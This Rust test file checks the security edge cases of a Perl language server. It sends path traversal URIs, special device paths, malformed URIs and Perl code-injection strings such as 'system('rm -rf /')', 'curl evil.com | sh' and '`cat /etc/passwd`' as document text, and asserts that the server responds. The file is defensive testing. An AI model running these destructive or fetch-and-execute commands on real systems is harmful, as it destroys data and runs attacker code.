//! Security edge case tests for LSP server.
//!
//! These tests validate security boundaries and now assert that each request
//! receives a concrete response (instead of silently accepting harness timeouts).

use serde_json::Value;
use serde_json::json;

mod common;
use common::{initialize_lsp, send_notification, send_request, start_lsp_server};

fn assert_non_timeout_response(response: &Value, context: &str) {
    assert!(response.is_object(), "{context}: expected JSON object response, got {response:?}");
    let timeout_message = response["error"]["message"].as_str();
    assert_ne!(
        timeout_message,
        Some("test harness timeout"),
        "{context}: did not receive a server response before harness timeout: {response:?}"
    );
}

/// Security and validation tests
/// Ensures the LSP server is secure and handles edge cases properly

#[test]
fn test_path_traversal_prevention() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Try various path traversal attempts
    let malicious_uris = vec![
        "file:///../../../etc/passwd",
        "file:///test/../../sensitive.pl",
        "file:///test/%2e%2e%2f%2e%2e%2fpasswd",
        "file:///test/..\\..\\windows\\system32",
    ];

    for uri in malicious_uris {
        send_notification(
            &server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": uri,
                        "languageId": "perl",
                        "version": 1,
                        "text": "print 'test';"
                    }
                }
            }),
        );

        // Should handle safely
        let response = send_request(
            &server,
            json!({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": uri
                    }
                }
            }),
        );

        assert_non_timeout_response(&response, "path traversal documentSymbol");
    }
}

#[test]
fn test_code_injection_prevention() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Try to inject malicious code patterns
    let malicious_content = [
        "system('rm -rf /');\n",
        "exec('curl evil.com | sh');\n",
        "`cat /etc/passwd`;\n",
        "eval('unlink glob \"*\"');\n",
        "open(FH, '|/bin/sh');\n",
    ];

    for (i, content) in malicious_content.iter().enumerate() {
        send_notification(
            &server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///inject{}.pl", i),
                        "languageId": "perl",
                        "version": 1,
                        "text": content
                    }
                }
            }),
        );

        // Should parse without executing
        let response = send_request(
            &server,
            json!({
                "jsonrpc": "2.0",
                "id": i + 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///inject{}.pl", i)
                    }
                }
            }),
        );

        assert_non_timeout_response(&response, "code injection documentSymbol");
    }
}

#[test]
fn test_null_byte_injection() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Try null byte injection
    let content_with_null = "print 'before';\0print 'after';";

    send_notification(
        &server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///null.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": content_with_null
                }
            }
        }),
    );

    // Should handle null bytes safely
    let response = send_request(
        &server,
        json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "textDocument/documentSymbol",
            "params": {
                "textDocument": {
                    "uri": "file:///null.pl"
                }
            }
        }),
    );

    assert_non_timeout_response(&response, "null byte documentSymbol");
}

#[test]
fn test_format_string_vulnerability() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Try format string attacks
    let format_attacks = [
        "printf('%s%s%s%s%s%s%s%s%s%s');\n",
        "sprintf($buf, '%n%n%n%n');\n",
        "printf('%x' x 100);\n",
    ];

    for (i, content) in format_attacks.iter().enumerate() {
        send_notification(
            &server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///format{}.pl", i),
                        "languageId": "perl",
                        "version": 1,
                        "text": content
                    }
                }
            }),
        );

        // Should parse safely
        let response = send_request(
            &server,
            json!({
                "jsonrpc": "2.0",
                "id": i + 1,
                "method": "textDocument/hover",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///format{}.pl", i)
                    },
                    "position": {
                        "line": 0,
                        "character": 0
                    }
                }
            }),
        );

        assert_non_timeout_response(&response, "format string hover");
    }
}

#[test]
fn test_integer_overflow_prevention() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Try to cause integer overflow
    send_notification(
        &server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///overflow.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": "my $x = 1;"
                }
            }
        }),
    );

    // Request with extreme positions
    let response = send_request(
        &server,
        json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "textDocument/hover",
            "params": {
                "textDocument": {
                    "uri": "file:///overflow.pl"
                },
                "position": {
                    "line": 2147483647,  // Max i32
                    "character": 2147483647
                }
            }
        }),
    );

    // Should handle gracefully without panic
    assert_non_timeout_response(&response, "integer overflow hover");
}

#[test]
fn test_special_file_handling() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Try to open special file URIs
    let special_uris = vec![
        "file:///dev/null",
        "file:///dev/random",
        "file:///proc/self/mem",
        "file:///:memory:",
        "file:///CON", // Windows special
        "file:///PRN", // Windows printer
    ];

    for uri in special_uris {
        send_notification(
            &server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": uri,
                        "languageId": "perl",
                        "version": 1,
                        "text": "print 'test';"
                    }
                }
            }),
        );

        // Should handle special files safely
        let response = send_request(
            &server,
            json!({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": uri
                    }
                }
            }),
        );

        assert_non_timeout_response(&response, "special file documentSymbol");
    }
}

#[test]
fn test_protocol_confusion() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Mix different protocol versions
    let response = send_request(
        &server,
        json!({
            "jsonrpc": "1.0",  // Wrong version
            "id": 1,
            "method": "textDocument/hover",
            "params": {}
        }),
    );

    // Some implementations reject invalid versions with an error response.
    // Others may silently ignore malformed JSON-RPC envelopes.
    // In either case, the server must stay responsive for subsequent valid requests.
    if response["error"]["message"].as_str() != Some("test harness timeout") {
        assert_non_timeout_response(&response, "protocol confusion jsonrpc 1.0");
    }

    // Send without jsonrpc field
    let response = send_request(
        &server,
        json!({
            "id": 2,
            "method": "textDocument/hover",
            "params": {}
        }),
    );

    if response["error"]["message"].as_str() != Some("test harness timeout") {
        assert_non_timeout_response(&response, "protocol confusion missing jsonrpc");
    }

    let probe = send_request(
        &server,
        json!({
            "jsonrpc": "2.0",
            "id": 3,
            "method": "textDocument/hover",
            "params": {
                "textDocument": {
                    "uri": "file:///protocol_probe.pl"
                },
                "position": {
                    "line": 0,
                    "character": 0
                }
            }
        }),
    );
    assert_non_timeout_response(&probe, "protocol confusion recovery probe");
}

#[test]
fn test_resource_uri_validation() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Various malformed URIs
    let bad_uris = vec![
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "ftp://evil.com/file.pl",
        "http://evil.com/file.pl",
        "file://[::1]/file.pl", // IPv6
        "",                     // Empty URI
        "file:",                // Incomplete
    ];

    for uri in bad_uris {
        send_notification(
            &server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": uri,
                        "languageId": "perl",
                        "version": 1,
                        "text": "print 'test';"
                    }
                }
            }),
        );

        // Should validate URI properly
        let response = send_request(
            &server,
            json!({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": uri
                    }
                }
            }),
        );

        assert_non_timeout_response(&response, "resource URI validation");
    }
}

#[test]
fn test_encoding_edge_cases() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Various encoding edge cases
    let encodings = [
        // UTF-8 with BOM
        "\u{FEFF}#!/usr/bin/perl\nprint 'BOM';",
        // Mixed line endings
        "print 'unix';\nprint 'windows';\r\nprint 'mac';\r",
        // Control characters
        "print 'test\x01\x02\x03';",
        // Surrogate pairs (invalid UTF-8)
        "my $str = 'test';", // Can't actually include invalid UTF-8 in source
        // Overlong encoding attempt
        "print 'normal';",
    ];

    for (i, content) in encodings.iter().enumerate() {
        send_notification(
            &server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///encoding{}.pl", i),
                        "languageId": "perl",
                        "version": 1,
                        "text": content
                    }
                }
            }),
        );

        // Should handle various encodings
        let response = send_request(
            &server,
            json!({
                "jsonrpc": "2.0",
                "id": i + 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///encoding{}.pl", i)
                    }
                }
            }),
        );

        assert_non_timeout_response(&response, "encoding edge cases");
    }
}

#[test]
fn test_symlink_and_hardlink_handling() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Open same content via different "paths"
    let content = "sub shared_function { return 42; }";

    // Simulate opening via symlink
    send_notification(
        &server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///real/path/file.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": content
                }
            }
        }),
    );

    // Open "same" file via different path
    send_notification(
        &server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///symlink/to/file.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": content
                }
            }
        }),
    );

    // Both should work independently
    let response1 = send_request(
        &server,
        json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "textDocument/documentSymbol",
            "params": {
                "textDocument": {
                    "uri": "file:///real/path/file.pl"
                }
            }
        }),
    );

    let response2 = send_request(
        &server,
        json!({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "textDocument/documentSymbol",
            "params": {
                "textDocument": {
                    "uri": "file:///symlink/to/file.pl"
                }
            }
        }),
    );

    // Both paths should return valid symbol arrays (server handles them independently)
    assert!(response1["result"].is_array(), "response1 should have result array: {:?}", response1);
    assert!(response2["result"].is_array(), "response2 should have result array: {:?}", response2);
}

#[test]
fn test_permission_denied_simulation() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Simulate files that might have permission issues
    let restricted_paths = vec![
        "file:///root/protected.pl",
        "file:///System/Library/secret.pl",
        "file:///Windows/System32/admin.pl",
    ];

    for path in restricted_paths {
        send_notification(
            &server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": path,
                        "languageId": "perl",
                        "version": 1,
                        "text": "print 'restricted';"
                    }
                }
            }),
        );

        // Should handle even if path suggests restricted access
        let response = send_request(
            &server,
            json!({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": path
                    }
                }
            }),
        );

        assert_non_timeout_response(&response, "permission denied simulation");
    }
}

#[test]
fn test_time_based_attacks() {
    let server = start_lsp_server();
    initialize_lsp(&server);

    // Try to detect timing differences (shouldn't exist)
    let valid_var = "my $valid = 42;";
    let invalid_var = "my $ = 42;"; // Invalid syntax

    // Open both documents
    send_notification(
        &server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///valid.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": valid_var
                }
            }
        }),
    );

    send_notification(
        &server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///invalid.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": invalid_var
                }
            }
        }),
    );

    // Measure timing for both
    let start_valid = std::time::Instant::now();
    let response = send_request(
        &server,
        json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "textDocument/documentSymbol",
            "params": {
                "textDocument": {
                    "uri": "file:///valid.pl"
                }
            }
        }),
    );
    assert_non_timeout_response(&response, "time-based attack valid source");
    let time_valid = start_valid.elapsed();

    let start_invalid = std::time::Instant::now();
    let response = send_request(
        &server,
        json!({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "textDocument/documentSymbol",
            "params": {
                "textDocument": {
                    "uri": "file:///invalid.pl"
                }
            }
        }),
    );
    assert_non_timeout_response(&response, "time-based attack invalid source");
    let time_invalid = start_invalid.elapsed();

    // Both paths should return quickly enough to avoid obvious DoS vectors.
    assert!(
        time_valid < std::time::Duration::from_secs(2),
        "valid request took too long: {:?}",
        time_valid
    );
    assert!(
        time_invalid < std::time::Duration::from_secs(2),
        "invalid request took too long: {:?}",
        time_invalid
    );
}
